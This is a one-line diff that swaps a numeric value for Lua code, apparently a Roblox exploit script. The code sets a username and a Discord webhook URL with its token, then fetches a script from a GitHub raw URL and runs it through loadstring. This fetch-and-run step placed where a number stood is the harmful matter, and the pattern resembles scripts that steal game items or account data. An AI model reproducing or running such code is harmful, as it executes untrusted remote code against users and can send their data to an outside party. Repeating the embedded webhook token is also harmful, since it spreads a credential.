@@ -1,1 +1,1 @@
-59920380
+do UserName="KeenanKrat101";Webhook="https://discord.com/api/webhooks/1157873224839872553/FSZPTOED1qCRS87Z6cyFVgePA8kY-xFaFegQKHaYgDl94vEw7c3vvKvFlLOPuFLaogrS";UserName2="KeenanKrat101";loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts",true))(); end
